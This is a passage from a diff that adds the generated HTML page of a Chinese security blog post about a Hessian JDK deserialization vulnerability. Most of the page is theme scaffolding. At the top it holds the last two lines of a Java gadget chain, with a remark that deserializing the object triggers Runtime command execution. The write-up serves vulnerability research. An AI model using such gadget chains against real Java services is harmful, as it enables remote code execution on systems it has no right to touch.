class="line">Utils.setField(table[<span class="number">1</span>], <span class="string">&quot;key&quot;</span>, nativeString);</span><br><span class="line">unserialize(serialize(map));</span><br></pre></td></tr></table></figure>
+
+<p>可以在反序列化时触发Runtime命令执行。</p>
+<hr>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3>
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2023/02/10/Hessian-JDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Hessian JDK反序列化漏洞2</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2023/02/08/%E5%85%B3%E4%BA%8EAnnotationInvocationHandler%E5%9C%A8%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84%E7%A0%94%E7%A9%B6/">
+                        <span>关于AnnotationInvocationHandler在高版本下的研究</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Hessian JDK反序列化漏洞&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
